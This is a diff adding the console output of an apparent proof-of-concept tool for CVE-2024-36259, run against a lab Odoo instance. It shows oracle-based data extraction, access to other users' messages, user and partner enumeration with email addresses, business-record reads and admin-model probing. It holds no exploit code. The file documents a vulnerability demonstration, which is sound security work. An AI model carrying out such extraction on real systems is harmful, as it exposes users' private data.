@@ -1,0 +1,89 @@
+╔══════════════════════════════════════════════════════════╗
+║   CVE-2024-36259 ADVANCED SECURITY ASSESSMENT TOOL      ║
+║          FOR AUTHORIZED TESTING ONLY                    ║
+╚══════════════════════════════════════════════════════════╝
+
+[!] WARNING: This demonstrates severe security impact
+[!] Target: http://10.211.55.23:8069
+[!] Database: odoo_db17
+
+[?] Confirm you have authorization to test this system (yes/no): yes
+[+] Authenticated as UID: 11
+[+] Current user: moustapha@mad.local
+
+[+] Starting advanced vulnerability demonstration...
+
+============================================================
+[DEMO] Oracle-Based Information Extraction
+============================================================
+
+[*] Demonstrating yes/no oracle technique...
+[*] Extracting admin user information via oracle...
+  [Admin exists check]: YES (Results: 1)
+  [Has admin rights]: NO (Results: 0)
+  [Email domain extraction]: YES (Results: 8)
+
+[*] Demonstrating character extraction via oracle...
+[*] Extracting first email address character pattern...
+  [+] Found 8 emails starting with 'a'
+  [+] Found 7 emails starting with 'm'
+  [+] Found 4 emails starting with 's'
+
+============================================================
+[DEMO] Full Message Extraction Capability
+============================================================
+
+[!] Message Access Statistics:
+    Total messages in system: 271
+    Your messages: 3
+    Other users' messages accessible: 268
+    Privilege escalation factor: 89.3x
+
+[*] Extracting sample of sensitive messages...
+  [!] Found 1 messages containing 'confidential'
+      - ID: 412, Date: 2025-08-23 22:07:43
+
+============================================================
+[DEMO] User and Partner Enumeration
+============================================================
+
+[!] Successfully enumerated 5 other users:
+    - Administrator (admin) - admin@example.com
+    - Maimouna (mai@mad.lu) - mai@mad.lu
+    - Marc Demo (demo) - mark.brown23@example.com
+    - Moustapha (mad) - False
+    - Portal Customer (customer@test.local) - customer@test.local
+
+[!] Successfully enumerated 5 business partners:
+    - Azure Interior - azure.Interior24@example.com
+    - Deco Addict - deco_addict@yourcompany.example.com
+    - Gemini Furniture - gemini_furniture@fake.geminifurniture.com
+    - Lumber Inc - lumber-inv92@example.com
+    - My Company - info@yourcompany.com
+
+============================================================
+[DEMO] Business Intelligence Extraction
+============================================================
+
+[*] Attempting to access business-critical models...
+
+[!] Model 'sale.order' is accessible: 24 records
+    [+] Successfully extracted 2 sample records
+
+[!] Model 'hr.employee' is accessible: 20 records
+    [+] Successfully extracted 2 sample records
+
+[!] Model 'project.project' is accessible: 2 records
+    [+] Successfully extracted 2 sample records
+
+============================================================
+[DEMO] Privilege Escalation Analysis
+============================================================
+
+[*] Testing access to administrative models...
+  [-] No access to System Parameters
+  [!] Can access Installed Modules: 608 records
+  [-] No access to Access Rights
+  [!] Can access User Groups: 75 records
+  [-] No access to Record Rules
+
